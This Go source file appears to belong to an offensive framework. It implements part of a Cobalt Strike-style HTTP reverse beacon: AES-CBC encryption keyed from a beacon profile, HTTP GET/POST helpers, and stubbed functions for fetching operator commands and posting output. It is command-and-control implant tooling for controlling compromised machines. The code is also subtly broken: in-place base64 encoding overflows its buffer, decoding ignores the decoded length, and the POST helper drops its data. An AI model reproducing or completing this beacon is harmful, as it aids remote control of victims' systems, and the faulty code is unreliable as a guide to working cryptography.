package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"gosploit-framework/external/module/cc/cobaltstrike/http_reverse_beacon/profile"

	"github.com/imroc/req"
)

func init() {
}

var httpReqeust = req.New()

// pkcs7 padding
func pad(data []byte) []byte {
	padSize := aes.BlockSize - len(data)%aes.BlockSize
	padding := bytes.Repeat([]byte{byte(padSize)}, padSize)
	return append(data, padding...)
}

func unpad(data []byte) []byte {
	length := len(data)
	if length == 0 {
		return nil
	}
	unPadding := int(data[length-1])
	return data[:(length - unPadding)]
}

func encrypt(plainData []byte) (cipherData []byte) {
	block, err := aes.NewCipher(profile.SessionKey)
	if err != nil {
		return nil
	}
	plainPadding := pad(plainData)
	cipherData = make([]byte, len(plainPadding))
	blockMode := cipher.NewCBCEncrypter(block, profile.RandomIV)
	blockMode.CryptBlocks(cipherData, plainPadding)
	base64.StdEncoding.Encode(cipherData, cipherData)
	return cipherData
}

func decrypt(cipherData []byte) (plainData []byte) {
	base64.StdEncoding.Decode(cipherData, cipherData)
	block, err := aes.NewCipher(profile.SessionKey)
	if err != nil {
		return nil
	}
	blockMode := cipher.NewCBCDecrypter(block, profile.RandomIV)
	plainData = make([]byte, len(cipherData))
	blockMode.CryptBlocks(plainData, cipherData)
	plainData = unpad(plainData)
	return plainData
}

func HttpPost(url, id string, data []byte) (resp *req.Resp) {
	resp, err := httpReqeust.Post(url)
	if err != nil {
		return nil
	}
	return resp
}

func HttpGet(url, cookies string) (resp *req.Resp) {
	resp, err := httpReqeust.Get(url)
	if err != nil {
		return nil
	}
	return resp
}

func GetCommandRequest() *req.Resp {
	return nil
}

func PostOutputReqeust() *req.Resp {
	return nil
}
